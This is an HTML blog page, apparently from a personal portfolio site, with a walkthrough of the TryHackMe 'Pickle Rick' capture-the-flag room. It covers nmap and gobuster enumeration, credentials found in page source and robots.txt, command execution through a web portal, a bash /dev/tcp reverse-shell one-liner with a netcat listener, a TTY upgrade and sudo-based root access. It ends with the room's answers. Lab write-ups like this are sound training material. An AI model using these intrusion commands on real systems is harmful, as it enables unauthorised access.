@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Yashwardhan Laharia</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.2.6/gsap.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Josefin+Sans&display=swap" rel="stylesheet">
+
+  <!--favicon-img-->
+  <link rel="icon" type="image/png" href="../images/picklerick/47d2d3ade1795f81a155d0aca6e4da96.jpeg">
+  <!--favicon-img-->
+
+  <link rel="stylesheet" href="../css/index.css">
+
+
+</head>
+
+<body>
+  <main id="blog-single">
+
+
+    <!-- CUSTOM CURSOR -->
+    <div class="cursor scale"></div>
+    <div class="cursor-two scale"></div>
+    <!-- CUSTOM CURSOR -->
+
+    <!-- PRELOADER -->
+    <div id="preloader">
+      <!-- <div class="p">
+                  <img src="images/headphone.png" alt="headphone">
+              </div> -->
+      <div class="p">Pickle Rick</div>
+    </div>
+    <!-- PRELOADER -->
+
+
+    <div id="blog-single-content">
+
+      <!-- NAVIGATION -->
+      <div class="navigation">
+        <div class="logo hover ">
+          <a href="../index.html" class="text">Yashwardhan Laharia</a>
+        </div>
+        <div class="menu-bar hover ">
+          <div class="menu-bar-name text">
+            Menu
+          </div>
+          <div class="menu-bar-lines text">
+            <div class="menu-bar-line"></div>
+            <div class="menu-bar-line"></div>
+          </div>
+        </div>
+      </div>
+      <!-- NAVIGATION -->
+
+
+
+      <!-- HEADING -->
+      <div class="heading">
+        <div class="text">
+          Pickle Rick
+        </div>
+      </div>
+
+      <!-- HEADING -->
+
+      <div class="center">
+
+
+        <!-- BLOG IMG -->
+        <div class="blog-img img">
+
+          <img src="../images/picklerick/banner.png" alt="blog-img">
+
+        </div>
+        <!-- BLOG IMG -->
+
+
+
+        <div class="center-para">
+
+          <!-- BLOG TEXT -->
+          <div class="blog-text">
+
+
+            <!-- BLOG INFO -->
+
+            <div class="blog-info">
+              <div class="blog-date text-scroll"><a
+                  href="https://tryhackme.com/room/picklerick">https://tryhackme.com/room/picklerick</a></div>
+            </div>
+            <!-- BLOG INFO -->
+
+
+            <!-- BLOG HEADING -->
+            <div class="blog-heading text-scroll">
+              This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to
+              help Rick make his potion and transform himself back into a human from a pickle.
+            </div>
+
+            <!-- BLOG HEADING -->
+
+
+            <!-- PARAGRAPH -->
+            <div class="blog-sub-heading text-scroll">
+              Ennumeration
+            </div>
+            <!-- PARAGRAPH -->
+
+
+            <br />
+
+            <!-- PARAGRAPH -->
+            <div class="para text-scroll">
+              Let's run nmap for some basic ennumeration to get an idea for what we are working with.
+            </div>
+            <!-- PARAGRAPH -->
+            <br />
+            <div class="text-scroll">
+              <code>
+              nmap -sC -sV -v -o nmap_scan {ip}
+            </code>
+            </div>
+            <br />
+            <div class="para text-scroll">
+              Which gives the following output:
+            </div>
+            <br />
+            <div class="text-scroll">
+              <pre><code>
+# Nmap 7.93 scan initiated Fri Jul 21 23:26:59 2023 as: nmap -sC -sV -v -oN nmap_scan 10.10.149.227
+Nmap scan report for 10.10.149.227
+Host is up (0.17s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a0c0bd1175c1cb348affd242cf2499f3 (RSA)
+|   256 367792d6b38adc9a0c6a185fd58cc3fa (ECDSA)
+|_  256 e201db55e39def6b912d278ffe460574 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Rick is sup4r cool
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jul 21 23:27:32 2023 -- 1 IP address (1 host up) scanned in 33.44 seconds
+              </code></pre>
+            </div>
+            <br />
+
+            <div class="para text-scroll">
+              We have ports 22 and 80 open.
+            </div>
+
+            <br />
+
+            <div class="blog-sub-heading text-scroll">
+              Web Interface
+            </div>
+
+            <br>
+            <div class="text-scroll para">
+              Checking out the web interace on port 80, we are greeted with the following page
+            </div>
+
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/interface.png" alt="img">
+              </div>
+            </div>
+
+            <div class="text-scroll para">
+              ctrl + u opens the source code, bingo there's a developer comment with a username!
+            </div>
+
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/note_to_self.png" alt="img">
+              </div>
+            </div>
+
+            <br>
+            <div class="text-scroll para">
+              We now have a username R1ckRul3s
+            </div>
+
+            <br>
+            <div class="text-scroll para">
+              Let's run gobuster to find more directories on the web server.
+            </div>
+
+            <br>
+            <div class="text-scroll">
+              <!-- <pre> -->
+              <code>
+                  gobuster -u {ip} -w /usr/share/wordlists/dirb/common.txt dir -o dir_scan
+                </code>
+              <!-- </pre> -->
+            </div>
+
+            <br>
+            <div class="text-scroll para">
+              Which gives the following directories:
+            </div>
+
+            <br>
+            <div class="text-scroll">
+              <pre>
+                <code>
+/.hta                 (Status: 403) [Size: 292]
+/.htaccess            (Status: 403) [Size: 297]
+/.htpasswd            (Status: 403) [Size: 297]
+/assets               (Status: 301) [Size: 315] [--> http://10.10.149.227/assets/]
+/index.html           (Status: 200) [Size: 1062]                                  
+/robots.txt           (Status: 200) [Size: 17]                                    
+/server-status        (Status: 403) [Size: 301]                                                       
+                </code>
+              </pre>
+            </div>
+
+            <br>
+            <div class="text-scroll para">
+              Checking the directories one at a time starting with assets
+            </div>
+
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/assets.png" alt="img">
+              </div>
+            </div>
+
+            <div class="text-scroll para">
+              Nothing fishy in the bootstrap files, they are - bootstrap files... same goes for jquery.<br>
+              The .gif and .jepg files are also normal images used throughout the challenge. So assets was a bust.<br>
+              Already seen index.html, so onto robots.txt now.
+
+            </div>
+
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/robots.png" alt="img">
+              </div>
+            </div>
+
+            <div class="text-scroll para">
+              So basically no allow/disallow list for a web crawler. Only <u><b><a
+                    href="https://www.youtube.com/watch?v=zkIqz2U6Vc0">Wubbalubbadubdub</a></b></u> hahaha<br>
+              So we now possibly have a username and password, R1ckRul3s:Wubbalubbadubdub. We have port 22 open, let's
+              try these credentials there.
+            </div>
+
+            <!-- IMAGES -->
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/fail_ssh.png" alt="img">
+              </div>
+            </div>
+
+            <div class="text-scroll para">
+              Nope, we need a key-pair to login via ssh. Hmm okay so this is a deadend. Let's try the directory scan
+              once more incase something has been missed out. I'll try looking for php files on the server.
+            </div>
+
+            <div class="text-scroll">
+
+              <code>
+                    gobuster -u {ip} -w /usr/share/wordlists/dirb/common.txt dir -x php -o dir_scan_php
+                  </code>
+            </div>
+            <br>
+            <div class="text-scroll para">
+              Which outputs:
+            </div>
+            <br>
+            <div class="text-scroll">
+              <pre>
+                  <code>
+/.hta                 (Status: 403) [Size: 292]
+/.hta.php             (Status: 403) [Size: 296]
+/.htaccess            (Status: 403) [Size: 297]
+/.htpasswd            (Status: 403) [Size: 297]
+/.htaccess.php        (Status: 403) [Size: 301]
+/.htpasswd.php        (Status: 403) [Size: 301]
+/assets               (Status: 301) [Size: 315] [--> http://10.10.149.227/assets/]
+/denied.php           (Status: 302) [Size: 0] [--> /login.php]                    
+/index.html           (Status: 200) [Size: 1062]                                  
+/login.php            (Status: 200) [Size: 882]                                   
+/portal.php           (Status: 302) [Size: 0] [--> /login.php]                    
+/robots.txt           (Status: 200) [Size: 17]                                    
+/server-status        (Status: 403) [Size: 301]                                                        
+                  </code>
+                </pre>
+            </div>
+
+            <div class="text-scroll para">
+              We have a login page Woooo!
+            </div>
+
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/login.png" alt="img">
+              </div>
+            </div>
+
+            <div class="text-scroll para">
+              Let's try the username and password here 🤞
+            </div>
+
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/portal.png" alt="img">
+              </div>
+              <div class="img-scroll">
+                <img src="../images/picklerick/denied.png" alt="img">
+              </div>
+            </div>
+
+            <div class="text-scroll para">
+              the /portal.php which earlier redirected to /login.php is now open to us. There looks like a command
+              portal to directly interface with the system. All other buttons on the menu bar lead to a denied page.<br>
+              <br>I passed the <b>ls</b> command as the input which shows access to a bunch of files.
+            </div>
+
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/ls.png" alt="img">
+              </div>
+            </div>
+
+            <div class="text-scroll para">
+              Getting a lay of the land, seeing where i am and what stuff do i have immediate access to
+            </div>
+
+            <div class="blog-text-img">
+
+              <div class="img-scroll">
+                <img src="../images/picklerick/pwd.png" alt="img">
+              </div>
+              <div class="img-scroll">
+                <img src="../images/picklerick/file.png" alt="img">
+              </div>
+            </div>
+
+            <div class="text-scroll para">
+              So this is complete access to the web application along with the secret Ingridient and a clue
+            </div>
+
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/no_cat.png" alt="img">
+              </div>
+            </div>
+
+            <div class="text-scroll para">
+              <b>cat</b> was disabled, <b>strings</b> works though - meaning we have the first <i>Super Secret
+                Ingridient</i>
+            </div>
+
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/strings.png" alt="img">
+              </div>
+            </div>
+
+            <div class="text-scroll para">
+              Similarly, let's read the clue
+            </div>
+
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/clue.png" alt="img">
+              </div>
+            </div>
+
+            <div class="text-scroll para">
+              I could manually keep sending one command at a time and eventually find the other Ingridient, but it's too
+              slow and tedious.<br>Let's spawn a reverse shell instead
+            </div>
+
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/reverse_shell.png" alt="img">
+              </div>
+            </div>
+
+            <div class="text-scroll">
+              <div class="para">
+                Get the IP of the host machine:
+              </div>
+
+              <code>
+                hostname -I
+              </code>
+
+              <br>
+              <div class="para">
+                Launch a netcat listner for the reverse shell on the host machine on port 8080 (or any other port):
+              </div>
+              <code>
+                nc -lvp 8080
+              </code>
+              <br>
+              <div class="para">
+                On the target machine:
+              </div>
+              <code>
+                bash -c 'bash -i >& /dev/tcp/{host ip}/{listening port} 0>&1'
+              </code>
+            </div>
+
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/second_ing.png" alt="img">
+              </div>
+            </div>
+
+            <div class="text-scroll para">
+              Navigate to <b>/home/rick/</b> to find to second ingredient.<br>
+              This is a pretty basic shell too, let's upgrade it to a fully interactive pty for more convinience.
+            </div>
+            <!-- bash -c 'bash -i >& /dev/tcp/10.17.51.40/8080 0>&1' -->
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/pty.png" alt="img">
+              </div>
+            </div>
+
+
+            <div class="text-scroll para">
+              I tried invoking a pty shell from python but it did not work, found this after some research:
+            </div>
+
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/pty_working.png" alt="img">
+              </div>
+            </div>
+
+            <div class="text-scroll para">
+              Testing if it worked by clearing the screen
+            </div>
+
+
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/works.png" alt="img">
+              </div>
+            </div>
+
+
+            <div class="text-scroll para">
+              Here's a breakdown of what i did:
+            </div>
+
+            <br><br>
+            <div class="text-scroll">
+              <div>
+                <span class="para">In the reverse shell, </span>
+                <code>
+                python -c 'import pty; pty.spawn("/bin/bash")'
+              </code>
+              </div>
+            </div>
+            <div class="text-scroll para">
+              Then stop the reverse shell with <b>Ctrl + Z</b>. You should return to the regular shell in your host
+              machine. Here,
+            </div>
+            <br>
+            <div class="text-scroll">
+              <pre>
+<code>$ stty -a #note the number of rows and columns from here
+$ stty raw -echo
+$ fg                  
+                </code>
+              </pre>
+            </div>
+            <br>
+            <div class="text-scroll para">
+              Now back inside the reverse shell,
+            </div>
+            <br>
+
+            <div class="text-scroll">
+              <pre>
+<code>$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows {num} columns {num}
+$ reset
+      </code>
+    </pre>
+            </div>
+
+            <div class="text-scroll para">
+              Now we can go onto prevledge escalation, very first thing to check is the current level of access we have via <b>sudo -l</b>. Turns out we have everything lol. So i just launched a child bash instance as root and it worked! Navigate to <b>/root/</b> and bingo the 3rd Ingridient is found.
+            </div>
+
+
+            <div class="blog-text-img">
+              <div class="img-scroll">
+                <img src="../images/picklerick/root.png" alt="img">
+              </div>
+            </div>
+
+
+
+
+
+
+
+
+
+            <br>
+            <div class="blog-sub-heading text-scroll" tag="Answers">
+              <u><a href="https://tryhackme.com/room/picklerick">Answers</a></u>
+            </div>
+            <br>
+            <div class="text-scroll para">
+
+
+              <pre>
+<b>What is the first ingredient that Rick needs?</b>
+mr. meeseek hair
+
+<b>What is the second ingredient in Rick’s potion?</b>
+1 jerry tear
+
+<b>What is the last and final ingredient?</b>
+fleeb juice
+</pre>
+
+            </div>
+
+            <div class="signature">
+              <span class="text-scroll">&nbsp;&nbsp;&nbsp;Yashwardhan ~ 5pid3rh7ck3r</span>
+            </div>
+
+          </div>
+
+        </div>
+
+      </div>
+
+
+
+
+
+
+
+
+      <!-- HEADPHONE IMG -->
+      <!-- <div class="headphone img text">
+    <img src="images/headphone.png" title="headphone zone" class="text" alt="headphone">
+  </div> -->
+      <!-- HEADPHONE IMG -->
+
+
+
+      <!-- progress-bar -->
+      <div class="progress-bar-container fade-in">
+        <div class="progressbar"></div>
+      </div>
+      <!-- progress-bar -->
+
+    </div>
+
+
+
+
+    <!-- NAVIGATION CONTENT -->
+
+    <div class="navigation-content">
+      <div class="navigation-logo hover opacity">
+        <a href="#" class="text">Yashwardhan</a>
+      </div>
+      <ul class="navigation-ul">
+        <li><a href="../index.html" data-text="Home" data-img="images/02background.gif">Home</a></li>
+        <li><a href="../about_me.html" data-text="About Me" data-img="images/about_page_img.jpg">About Me</a></li>
+        <li><a href="../my_projects.html" data-text="Projects" data-img="images/projects_bg.jpg">Projects</a></li>
+        <li><a href="../my_blogs.html" data-text="Blogs" data-img="images/Blog_img.jpg">Blogs</a></li>
+        <li><a href="../contact-one.html" data-text="Contact" data-img="images/yellow_city.jpg">Contact</a>
+        </li>
+      </ul>
+      <div class="navigation-close hover about-close opacity">
+        <div class="navigation-close-line"></div>
+        <div class="navigation-close-line"></div>
+      </div>
+
+      <div class="project-preview"></div>
+
+
+      <!-- HEADPHONE IMG -->
+      <!-- <div class="headphone-navigation opacity">
+        <img src="../images/headphone.png" title="headphone zone" class="text" alt="headphone">
+      </div> -->
+      <!-- HEADPHONE IMG -->
+
+
+      <!-- SOCIAL MEDIA LINKS -->
+      <!-- <div class="social-media-links-navigation">
+        <ul>
+          <li><a href="#" class="text hover opacity">YT</a></li>
+          <li><a href="#" class="text hover opacity">FB</a></li>
+          <li><a href="#" class="text hover opacity">IG</a></li>
+        </ul>
+      </div> -->
+      <!-- SOCIAL MEDIA LINKS -->
+
+    </div>
+
+    <!-- NAVIGATION CONTENT -->
+
+
+
+
+
+  </main>
+
+  <script src="../js/jquery.min.js"></script>
+  <script src="../js/bez.js"></script>
+  <script src="../js/pace.js"></script>
+  <script src="../js/index.js"></script>
+
+
+</body>
+
+</html>
